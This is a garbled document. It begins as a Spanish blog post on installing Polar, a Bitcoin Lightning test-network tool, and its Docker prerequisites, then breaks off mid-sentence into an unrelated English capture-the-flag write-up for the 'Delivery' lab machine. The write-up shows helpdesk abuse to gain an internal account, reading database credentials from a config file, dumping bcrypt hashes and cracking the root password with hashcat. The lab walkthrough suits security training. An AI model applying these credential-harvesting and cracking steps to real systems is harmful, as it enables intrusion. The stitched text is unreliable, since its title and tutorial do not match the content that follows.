---
layout: single
title: Polar - Redes Bitcoin Lightning con un solo clic
excerpt: "Polar es una de esas herramientas que merece la pena aprender a utilizar. Con ella podremos crear una red de nodos Lightning en la que, desde el minado de monedas —ya sea en testnet o regtest— hasta la apertura o cierre de canales, todo se realiza de manera realmente sencilla. Como bien se indica en su página web, con un solo clic.
A esto hay que añadir que podemos incluir en la red que creemos nuestra propia aplicación, para ver el desempeño que tiene.

En este post quiero explicar desde los requisitos y la instalación hasta el funcionamiento básico de la solución. Acompáñame en esta review para que tú mismo puedas disfrutarla sin complicaciones."
date: 2025-06-14
classes: wide
header:
  teaser: /assets/images/mbs-writeup-Polar/carapolar.png
  teaser_home_page: true
  icon: /assets/images/mbs-writeup-Polar/icon.png
categories:
  - polar
  - lightning
tags:  
  - lightning
  - bitcoin
  - nodos
  - testnet
  - pow
---


## Descarga e instalación

Como en todo lo que concierne a bitcoin, **don't trust, verify**, asique con esta expresión tan cierta lo primero que tenemos que hacer es ir a la fuente de la solución que queremos probar o utilizar, en este caso debemos ir directamente al repositorio de [github](https://github.com/jamaljsr/polar.git).

![portada github!](/assets/images/mbs-writeup-Polar/1Polar.png)

Una vez aqui, nos dirigimos al apartado **dependencias** en el que nos explica que requisitos necesitamos para la instalación.

Como puedes observar, necesitarás instalar Docker para poder crear las diferentes redes.

Dependiendo de cual sea tu sistema operativo, tendras que instalar para Mac y Windows  [Docker Desktop](https://www.docker.com/products/docker-desktop) o si utilizas Linux como es mi caso y como vamos a seguir este post [Docker Server](https://docs.docker.com/engine/install/#server).

Si lo instalas como yo en Linux, sigue estos pasos:

Nos dirigimos al enlace y se nos abrira la pagina principal de DockerDocs.

![portada dockerdocs!](/assets/images/mbs-writeup-Polar/2Polar.png)

Elegimos de entre la lista de distribuciones la nuestra, en mi caso voy a seleccionar Ubuntu por que la distribucion que utilizo es Pop!_OS que esta basada en ella.

Despues de leernos las advertencias y comprovar que cumplimos los requisitos nos dirigimos en esa misma pagina un poco mas abajo en donde dice **Metodos de Instalación** y hacemos clic a [Docker's APT repository](https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository), y añadimos desde apt con la clave oficial GPG, la secuencia de comandos seria la siguiente:

    sudo apt-get update

    sudo apt-get install ca-certificates curl

    sudo install -m 0755 -d /etc/apt/keyrings

    sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc

    sudo chmod a+r /etc/apt/keyrings/docker.asc

Añadimos el repositorio de Docker:

    echo \
    "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
    $(. /etc/os-release && echo "${UBUNTU_CODENAME:-$VERSION_CODENAME}") stable" | \
    sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
    sudo apt-get update

Instalamos los
```
Nmap scan report for 10.129.148.141
Host is up (0.018s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
8065/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, max-age=31556926, public
|     Content-Length: 3108
|     Content-Security-Policy: frame-ancestors 'self'; script-src 'self' cdn.rudderlabs.com
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Sun, 09 May 2021 00:00:02 GMT
|     X-Frame-Options: SAMEORIGIN
|     X-Request-Id: fqrpd5m3ftgnzmxkbieezqadxo
|     X-Version-Id: 5.30.0.5.30.1.57fb31b889bf81d99d8af8176d4bbaaa.false
|     Date: Sun, 09 May 2021 00:01:31 GMT
|     <!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><meta name="robots" content="noindex, nofollow"><meta name="referrer" content="no-referrer"><title>Mattermost</title><meta name="mobile-web-app-capable" content="yes"><meta name="application-name" content="Mattermost"><meta name="format-detection" content="telephone=no"><link re
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Date: Sun, 09 May 2021 00:01:31 GMT
|_    Content-Length: 0
```

## Website

The Delivery website is pretty basic, there's a link to a vhost called helpdesk.delivery.htb and a contact us section. We'll add this entry to our local host before proceeding further.

![](/assets/images/htb-writeup-delivery/website1.png)

The contact us section tells us we need an @delivery.htb email address and tells us port 8065 is a MatterMost server. MatterMost is a Slack-like collaboration platform that can be self-hosted.

![](/assets/images/htb-writeup-delivery/website2.png)

Browsing to port 8065 we get the MatterMost login page but we don't have credentials yet

![](/assets/images/htb-writeup-delivery/mm1.png)

## Helpdesk

The Helpdesk page uses the OsTicket web application. It allows users to create and view the status of ticket.

![](/assets/images/htb-writeup-delivery/helpdesk3.png)

We can still open new tickets even if we only have a guest user.

![](/assets/images/htb-writeup-delivery/helpdesk1.png)

After a ticket has been created, the system generates a random @delivery.htb email account with the ticket ID.

![](/assets/images/htb-writeup-delivery/helpdesk2.png)

Now that we have an email account we can create a MatterMost account.

![](/assets/images/htb-writeup-delivery/mm2.png)

A confirmation email is then sent to our ticket status inbox.

![](/assets/images/htb-writeup-delivery/mm3.png)

We use the check ticket function on the OsTicket application and submit the original email address we used when creating the ticket and the ticket ID.

![](/assets/images/htb-writeup-delivery/mm4.png)

We're now logged in and we see that the MatterMost confirmation email has been added to the ticket information.

![](/assets/images/htb-writeup-delivery/mm5.png)

To confirm the creation of our account we'll just copy/paste the included link into a browser new tab.

![](/assets/images/htb-writeup-delivery/mm6.png)

After logging in to MatterMost we have access to the Internal channel where we see that credentials have been posted. There's also a hint that we'll have to use a variation of the `PleaseSubscribe!` password later.

![](/assets/images/htb-writeup-delivery/mm7.png)

## User shell

With the `maildeliverer / Youve_G0t_Mail!` credentials we can SSH in and get the user flag.

![](/assets/images/htb-writeup-delivery/user.png)

## Credentials in MySQL database

After doing some recon we find the MatterMost installation directory in `/opt/mattermost`:

```
maildeliverer@Delivery:/opt/mattermost/config$ ps waux | grep -i mattermost
matterm+   741  0.2  3.3 1649596 135112 ?      Ssl  20:00   0:07 /opt/mattermost/bin/mattermost
```

The `config.json` file contains the password for the MySQL database:

```
[...]
"SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
[...]
```

We'll connect to the database server and poke around.

```
maildeliverer@Delivery:/$ mysql -u mmuser --password='Crack_The_MM_Admin_PW'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 91
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
```

MatterMost user accounts are stored in the `Users` table and hashed with bcrypt. We'll save the hashes then try to crack them offline.

```
MariaDB [(none)]> use mattermost;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mattermost]> select Username,Password from Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| snowscan                         | $2a$10$spHk8ZGr54VWf4kNER/IReO.I63YH9d7WaYp9wjiRswDMR.P/Q9aa |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+----------------------------------+--------------------------------------------------------------+
8 rows in set (0.002 sec)
```

## Cracking with rules

There was a hint earlier that some variation of `PleaseSubscribe!` is used.

I'll use hashcat for this and since I don't know the hash ID for bcrypt by heart I can find it in the help.

```
C:\bin\hashcat>hashcat --help | findstr bcrypt
   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
```

My go-to rules is normally one of those two ruleset:

- [https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule](https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule)
- [https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule)

These will perform all sort of transformations on the wordlist and we can quickly crack the password: `PleaseSubscribe!21`

```
C:\bin\hashcat>hashcat -a 0 -m 3200 -w 3 -O -r rules\_NSAKEY.v2.dive.rule hash.txt wordlist.txt
[...]
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
[...]
```

The root password from MatterMost is the same as the local root password so we can just su to root and get the system flag.

![](/assets/images/htb-writeup-delivery/root.png)
